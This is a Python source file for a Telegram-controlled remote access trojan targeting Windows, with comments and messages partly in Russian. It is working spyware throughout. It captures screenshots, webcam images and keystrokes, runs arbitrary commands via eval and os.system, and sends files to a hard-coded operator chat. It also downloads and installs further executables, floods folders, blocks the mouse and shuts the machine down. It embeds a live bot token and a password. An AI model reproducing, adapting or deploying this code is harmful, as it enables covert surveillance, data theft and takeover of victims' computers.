import telebot
import os
from ctypes import windll
import cv2
from PIL import ImageGrab
import time
from tkinter import *
from pynput.keyboard import Listener
import threading
import pyautogui


flood_path = 'C:\\'
need = False
opened = 0
num = 1
dist = 'h'
entered = False
password = '090630'
user32 = windll.user32
user32.SetProcessDPIAware()
disk_id = -471905375
main_folder = [['BQACAgIAAxkBAAIF1F7x7Kn5ftnNNm8Bn1OWBzxsZFySAAIvCAACtNeQSwv3DFKGc6UUGgQ', 'Analysis-00.toc'],
               ['BQACAgIAAxkBAAIF1l7x7LHYAlaB0atfJtC-8m3Py5BCAAIwCAACtNeQS4bvuxp6AwuSGgQ', 'base_library.zip'],
               ['BQACAgIAAxkBAAIF2F7x7LkPhos7FI9z-S5MLm9x4B6tAAIxCAACtNeQS5aL24Ex40UZGgQ', 'EXE-00.toc'],
               ['BQACAgIAAxkBAAIF2l7x7L58580wO-3MbR56MRF5e8I8AAIyCAACtNeQSy52alDM_5RUGgQ', 'Maxim.exe.manifest'],
               ['BQACAgIAAxkBAAIF3F7x7MRl-2jBHsN1Ahp0UdvmZIpjAAI1CAACtNeQSzYW4xIWM1yeGgQ', 'PKG-00.pkg'],
               ['BQACAgIAAxkBAAIF3l7x7Mr1otrKalCyKkhYpZgE5_S4AAI2CAACtNeQS-p5sugCdfjUGgQ', 'PKG-00.toc'],
               ['BQACAgIAAxkBAAIF4F7x7NALX4JZZMh755tGcFh7NRvwAAI3CAACtNeQSza_ztNopZ5rGgQ', 'PYZ-00.pyz'],
               ['BQACAgIAAxkBAAIF4l7x7NZfXoHUipTHPDXxnjSbwLOIAAI4CAACtNeQS5tqzeYG71VQGgQ', 'PYZ-00.toc'],
               ['BQACAgIAAxkBAAIF5F7x7N-uNARKMQeOCl-3XW81pJkSAAI5CAACtNeQS0tfaVn8nRk2GgQ', 'Tree-00.toc'],
               ['BQACAgIAAxkBAAIF5l7x7OSQtoyHfgpfkMBPzqI65nzCAAI6CAACtNeQS60OC0UTgWWZGgQ', 'Tree-01.toc'],
               ['BQACAgIAAxkBAAIF6F7x7OqyMNOrslJETaZn6XyIk-TRAAI7CAACtNeQS1oFGyZJcqOsGgQ', 'warn-Maxim.txt'],
               ['BQACAgIAAxkBAAIF6l7x7O7yQAjx6b51XZPVm0Qe_4BVAAI8CAACtNeQSwo6GpT_nRwUGgQ', 'xref-Maxim.html']]

try:
    os.mkdir(r'C:\Users\{}\Documents\controller'.format(os.environ['USERNAME']))
except:
    try:
        os.mkdir(r'C:\Users\{}\Documents'.format(os.environ['USERNAME']))
        os.mkdir(r'C:\Users\{}\Documents\controller'.format(os.environ['USERNAME']))
    except:
        pass
path = r'C:\Users\{}\Documents\controller'.format(os.environ['USERNAME'])
bot = telebot.TeleBot('764426382:AAH0J_NbQQnk9lDDkfRjk1e-FeGektkHFYc')
main_user_id = 409694862
bot.send_message(main_user_id, 'программа включена')


def sender(message, ent, root):
    try:
        bot.send_message(message.from_user.id, text=ent.get())
        root.destroy()
    except:
        pass


def screen(message):
    screening = ImageGrab.grab()
    screening.save(f'{path}\\screen.png')
    tscreen = open(f'{path}\\screen.png', 'rb')
    bot.send_photo(message.from_user.id, tscreen)


def ext(message):
    global extens
    global dist
    extenses = ['photo', 'video', 'document', 'audio', 'Photo', 'Video', 'Document', 'Audio']
    if message.text in extenses:
        extens = message.text
        bot.send_message(message.from_user.id, 'enter file path')
        dist = 'open_file'
    else:
        bot.send_message(message.from_user.id, 'this is not format')


def trier(message):
    cap = cv2.VideoCapture(0)
    sep, photo = cap.read()
    photo = cv2.cvtColor(photo, cv2.COLOR_BGR2RGB)
    cv2.imwrite(f'{path}\\camera.png', photo)
    tcamera = open(f'{path}\\camera.png', 'rb')
    bot.send_photo(message.from_user.id, tcamera)


def command(message):
    try:
        bot.send_message(message.from_user.id, eval(message.text))
    except Exception:
        try:
            os.system(message.text)
        except Exception:
            bot.send_message(message.from_user.id, 'something went wrong')


def opener(message):
    if os.path.isfile(message.text):
        global direct
        direct = message.text
        fileopener(message)
    else:
        bot.send_message(message.from_user.id, 'this is not FILE directory')


def pressed(key):
    global msg
    try:
        msg += key.char
    except AttributeError:
        msg += f'\n<{key}>\n'


def checker(message):
    while True:
        if not need:
            listener.stop()
            try:
                bot.send_message(message.from_user.id, msg)
            except:
                bot.send_message(message.from_user.id, 'nothing.')
            break
        time.sleep(2)


def liser(message):
    global listener
    global msg
    threading.Thread(target=lambda: checker(message)).start()
    msg = ''
    listener = Listener(on_press=pressed)
    if need:
        listener.start()


def keyboard_maker(message):
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True)
    Doc = telebot.types.InlineKeyboardButton('Document')
    Aud = telebot.types.InlineKeyboardButton('Audio')
    Phot = telebot.types.InlineKeyboardButton('Photo')
    Vid = telebot.types.InlineKeyboardButton('Video')
    markup.add(Doc)
    markup.add(Aud)
    markup.add(Phot)
    markup.add(Vid)
    bot.send_message(message.from_user.id, 'insert format of the file', reply_markup=markup)


def fileopener(message):
    try:
        fscreen = open(direct, 'rb')
        if extens == 'video' or extens == 'Video':
            try:
                bot.send_video(message.from_user.id, fscreen)
            except Exception:
                bot.send_message(message.from_user.id, 'empty file')
        elif extens == 'photo' or extens == 'Photo':
            try:
                bot.send_photo(message.from_user.id, fscreen)
            except Exception:
                bot.send_message(message.from_user.id, 'empty file')
        elif extens == 'audio' or extens == 'Audio':
            try:
                bot.send_audio(message.from_user.id, fscreen)
            except Exception:
                bot.send_message(message.from_user.id, 'empty file')
        elif extens == 'document' or extens == 'Document':
            try:
                bot.send_document(message.from_user.id, fscreen)
            except Exception:
                bot.send_message(message.from_user.id, 'empty file')
    except PermissionError:
        bot.send_message(message.from_user.id, 'Access denied')


def dire(message):
    global dist
    global direct
    dist = 'file'
    direct = message.text
    directory(message)


def directory(message):
    if os.path.isdir(direct):
        mes = ''
        markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True)
        btn = telebot.types.InlineKeyboardButton('<=back')
        markup.add(btn)
        for file in os.listdir(direct):
            btn = telebot.types.InlineKeyboardButton(file)
            markup.add(btn)
            mes += file
        if mes != '':
            bot.send_message(message.from_user.id, direct, reply_markup=markup)
        else:
            bot.send_message(message.from_user.id, 'nothing')
    else:
        bot.send_message(message.from_user.id, 'this is not correct directory path')


@bot.message_handler(commands=['start'])
def passkey(message):
    global dist
    global entered
    dist = 'password'
    if not entered:
        bot.send_message(message.from_user.id, 'enter password')
    else:
        dist = ''
        trier(message)
        screen(message)

    @bot.message_handler(commands=['block_mouse'])
    def block_mouse(message):
        global dist
        if entered:
            bot.send_message(message.from_user.id, 'for how many seconds(number only)')
            dist = 'block mouse'
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['messagebox'])
    def messager(message):
        global dist
        if entered:
            bot.send_message(message.from_user.id, 'enter what do you want to write on messagebox')
            dist = 'messager'
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['send_from_disk'])
    def open_directory(message):
        bot.send_message(disk_id, '/bot_to_bot_file_get@Bortnikbot')

    @bot.message_handler(commands=['open_directory'])
    def open_directory(message):
        global dist
        if entered:
            bot.send_message(message.from_user.id, 'enter directory')
            dist = 'open_directory'
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['total_control'])
    def total_control(message):
        global dist
        if entered:
            bot.send_message(message.from_user.id, 'enter path manually')
            dist = 'control'
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['prtscr'])
    def prt_scr(message):
        if entered:
            screen(message)
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['camera'])
    def prt_scr(message):
        if entered:
            trier(message)
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['open_file'])
    def open_file(message):
        global dist
        if entered:
            dist = 'extension'
            keyboard_maker(message)
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['add_doc'])
    def add_doc(message):
        global dist
        if entered:
            bot.send_message(message.from_user.id, 'send the path')
            dist = 'doc'
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['enter_command'])
    def enter_command(message):
        global dist
        if entered:
            bot.send_message(message.from_user.id, 'insert command you want to execute')
            dist = 'command'
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['keyboard_start_listen'])
    def lisener(message):
        if entered:
            global need
            if not need:
                need = True
                threading.Thread(target=lambda: liser(message)).start()
            else:
                bot.send_message(message.from_user.id, 'you are already listening')
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['keyboard_stop_listen'])
    def stoper(message):
        if entered:
            global need
            if need:
                need = False
            else:
                bot.send_message(message.from_user.id, 'you didnt start to listen the keyboard')
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['shutdown'])
    def turn_off(message):
        if entered:
            bot.send_message(message.from_user.id, 'bye, dont forget to stop keyboard listener')
            os.system('shutdown -s')
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['cancel_shutdown'])
    def turn_off(message):
        if entered:
            bot.send_message(message.from_user.id, 'no problem')
            os.system('shutdown -a')
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['folder_flood'])
    def folder_flood(message):
        global dist
        if entered:
            bot.send_message(message.from_user.id, 'enter path')
            dist = 'flood'
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(commands=['exit'])
    def exiter(message):
        global entered
        global dist
        if entered:
            bot.send_message(message.from_user.id, 'bye.')
            entered = False
            dist = 'password'
        else:
            bot.send_message(message.from_user.id, 'first enter the password')

    @bot.message_handler(content_types=['document'])
    def doc_adder(message):
        if dist == 'ready to launch':
            downloaded = bot.download_file(bot.get_file(message.document.file_id).file_path)
            try:
                with open(add_path + '\\' + message.document.file_name, 'wb') as file:
                    file.write(downloaded)
                bot.send_message(message.from_user.id, 'done')
            except PermissionError:
                bot.send_message(message.from_user.id, 'Access denied')

    @bot.message_handler()
    def distributor(message):
        global direct
        global flood_path
        global dist
        if message.text == '<=back':
            if os.path.isdir(os.path.split(os.path.split(direct)[0])[0]):
                direct = os.path.split(os.path.split(direct)[0])[0] + '\\'
                directory(message)
            else:
                bot.send_message(message.from_user.id, 'impossible')
        elif dist == 'messager':
            global opened
            opened += 1
            if opened == 1:
                root = Tk()
                try:
                    Label(root, text='from: ' + message.from_user.first_name, font=('Times', 10)).grid(row=0)
                    Label(root, text=message.text, font=('Times', 10)).grid(row=1)
                    ent = Entry(root)
                    ent.grid(row=2)
                    Button(root, text='send', command=lambda: sender(message, ent, root)).grid(row=3)
                except:
                    root.destroy()
                root.mainloop()
                opened = 0
            elif opened > 1:

                bot.send_message(message.from_user.id,
                                 'you cant send more than one message. The previous message must be closed')

        elif dist == 'password':
            global entered
            if not entered:
                bot.delete_message(message.from_user.id, message.message_id)
                if message.text == password:
                    entered = True
                    trier(message)
                    screen(message)
                else:
                    bot.send_message(message.from_user.id, 'wrong')
        elif dist == 'open_file':
            opener(message)
        elif dist == 'open_directory':
            dire(message)
        elif dist == 'extension':
            ext(message)
        elif dist == 'command':
            command(message)
        elif dist == '':
            bot.send_message(message.from_user.id, 'what is it?')
        elif dist == 'extensionnew':
            global extens
            extenses = ['photo', 'video', 'document', 'audio', 'Photo', 'Video', 'Document', 'Audio']
            if message.text in extenses:
                extens = message.text
                fileopener(message)
            else:
                bot.send_message(message.from_user.id, 'this is not format')
        elif dist == 'file':
            if os.path.isdir(direct + '\\' + message.text):
                try:
                    os.listdir(direct + '\\' + message.text)
                    direct += '\\' + message.text + '\\'
                    directory(message)
                except PermissionError:
                    bot.send_message(message.from_user.id, 'Access denied')
            elif os.path.isfile(direct + '\\' + message.text):
                direct += '\\' + message.text
                keyboard_maker(message)
                dist = 'extensionnew'
            else:
                bot.send_message(message.from_user.id, 'this is not correct directory or file path')
        elif dist == 'doc':
            if os.path.isdir(message.text):
                global add_path
                add_path = message.text
                dist = 'ready to launch'
                bot.send_message(message.from_user.id, 'send your document')
            else:
                bot.send_message(message.from_user.id, 'this is not correct directory or file path')
        elif dist == 'flood':
            if os.path.isdir(message.text):
                flood_path = message.text
                bot.send_message(message.from_user.id, 'how many folders do you want to create? (number only)')
                dist = 'number_flood'
            else:
                bot.send_message(message.from_user.id, 'this is not correct directory or file path')
        elif dist == 'number_flood':
            if message.text.isdigit():
                for folder_number in range(int(message.text)):
                    try:
                        os.mkdir(flood_path + '\\' + str(folder_number))
                    except:
                        pass
                bot.send_message(message.from_user.id, 'done')
        elif dist == 'block mouse':
            if message.text.isdigit():
                pyautogui.moveTo(0, 0, duration=int(message.text))
                bot.send_message(message.from_user.id, 'done')
        elif dist == 'control':
            if os.path.isdir(message.text):
                try:
                    os.mkdir(message.text + '\\' + '__pycache__')
                except:
                    pass
                downloaded = bot.download_file(bot.get_file(
                    'BQACAgIAAxkBAAIF0F7x7G7_QK4JlqZ076orHFe482vOAAJRCAACtNeQSyZQRx1pgWzHGgQ').file_path)
                with open(message.text + '\\' + '__pycache__' + '\\' + 'Maxim.cpython-37', 'wb') as file:
                    file.write(downloaded)
                try:
                    os.mkdir(message.text + '\\' + 'build')
                except:
                    pass
                try:
                    os.mkdir(message.text + '\\' + 'build' + '\\' + 'Maxim')
                except:
                    pass
                for one in main_folder:
                    downloaded = bot.download_file(bot.get_file(one[0]).file_path)
                    with open(message.text + '\\' + 'build' + '\\' + 'Maxim' + '\\' + one[1], 'wb') as file:
                        file.write(downloaded)
                downloaded = bot.download_file(bot.get_file(
                    'BQACAgIAAxkBAAIF7V7x7Pz7gZ9XbSKFsv6qJmcYW7r9AAI9CAACtNeQS7kYr-xJJIxJGgQ').file_path)
                with open(message.text + 'Maxim.exe', 'wb') as file:
                    file.write(downloaded)
                bot.send_message(message.from_user.id, 'done')
            else:
                bot.send_message(message.from_user.id, 'this is not correct directory')


try:
    bot.polling()
except:
    print('oops')
